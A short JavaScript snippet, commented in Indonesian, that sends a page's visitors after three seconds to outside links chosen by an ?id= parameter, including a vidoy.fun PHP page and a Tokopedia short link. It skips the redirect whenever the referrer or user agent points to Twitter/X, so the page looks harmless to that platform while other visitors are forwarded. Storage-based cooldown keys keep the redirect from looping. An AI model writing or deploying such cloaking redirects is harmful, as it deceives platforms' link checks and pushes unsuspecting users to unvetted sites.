(function () {
  try {
    // === SETTING ===
    var cooldownMs = 60 * 1000;   // jeda antar redirect (1 menit)
    var delayMs    = 3000;        // delay sebelum redirect (ms)

    // daftar ID → link tujuan
    var redirectMap = {
      "vidoy": "https://vidoy.fun/cB6Tyq0.php",
      "promo": "https://example.com/promo.html",
      "tokped": "https://tokopedia.link/xyz123"
    };
    // ===============

    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1/i.test(qs)) return;

    // ambil id dari query
    var params = new URLSearchParams(location.search);
    var id = params.get("id");
    if (!id) return;

    var target = redirectMap[id];
    if (!target || !/^https:\/\//i.test(target)) return;

    // deteksi Twitter/X
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);

    // kalau dari Twitter, STOP
    if (isX) return;

    // anti-loop
    var page = location.origin + location.pathname;
    var sessKey = "redir_all_seen:" + page + "|id=" + id;
    var cdKey   = "redir_all_cd:"   + page + "|id=" + id;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    sessionStorage.setItem(sessKey,"1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // redirect otomatis setelah delay
    setTimeout(function () {
      try { location.href = target; } catch(_) {}
    }, delayMs);

  } catch (_) {}
})();
